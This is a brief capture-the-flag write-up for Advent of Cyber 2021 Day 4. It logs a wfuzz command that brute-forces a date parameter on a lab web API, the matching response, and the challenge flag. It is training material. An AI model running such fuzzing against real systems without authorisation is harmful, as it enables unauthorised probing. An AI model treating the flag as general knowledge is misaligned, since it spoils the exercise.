# Advent of cyber 2021

# [Day 4] Web Exploitation Santa's watching

# Target IP : 10.10.108.179

# port 80 web server

/api (Status: 301) [Size: 312] [--> http://10.10.108.179/api/]

http://10.10.108.179/api/site-log.php

```bash

wfuzz -c -z file,wordlist http://10.10.108.179/api/site-log.php?date=FUZZ
```
000000026:   200        0 L      1 W        13 Ch       "20201125"

flag : THM{D4t3_AP1}  